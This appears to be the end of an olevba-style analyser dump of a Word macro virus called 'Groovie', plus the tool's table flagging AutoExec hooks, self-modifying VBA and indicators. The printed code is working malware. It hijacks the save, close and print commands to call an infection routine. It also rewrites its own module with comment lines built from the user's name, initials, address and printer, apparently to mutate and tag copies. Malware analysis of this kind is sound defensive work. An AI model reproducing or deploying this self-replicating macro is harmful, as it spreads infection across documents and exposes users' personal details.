 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Call I15
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End Sub
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Sub fileclose()
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
On Error Resume Next
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
I08 = True
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Call I15
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
ActiveDocument.Close
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End Sub
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Sub fileprint()
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
On Error Resume Next
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Call I15
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Dialogs(wdDialogFilePrint).Show
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End Sub
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Sub ViewVBCode()
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
MsgBox "It's GROOVIE", vbOKOnly, "•  ALT-F11  • says..."
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End Sub
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Sub FileTemplates()
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End Sub
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Function I17()
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
On Error GoTo docek
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    If ActiveDocument.Name <> "" Then
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
        I07 = True
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    End If
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    GoTo over
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
docek:
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
    I07 = False
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
over:
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End Function
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Function I16()
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Randomize
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
rn = Int(Rnd * 999)
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
With Application.VBE.ActiveVBProject.VBComponents("Groovie").CodeModule
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
For x = 2 To 358 Step 2
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
.DeleteLines x
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
.InsertLines x, " ' " & Application.UserInitials & Now & rn & Application.UserName & Application.UserAddress & rn & Application.ActivePrinter
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
Next x
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End With
 ' AM07.03.01 10:02:36218Andreas Marx218HP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW
End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|RegCloseKey         |May read or write registry keys              |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |advapi32.dll        |Executable file name                         |
|IOC       |Application.VBE     |Executable file name                         |
|Base64    |~)^                 |file                                         |
|String    |                    |                                             |
|Base64    |O*^                 |Type                                         |
|String    |                    |                                             |
+----------+--------------------+---------------------------------------------+
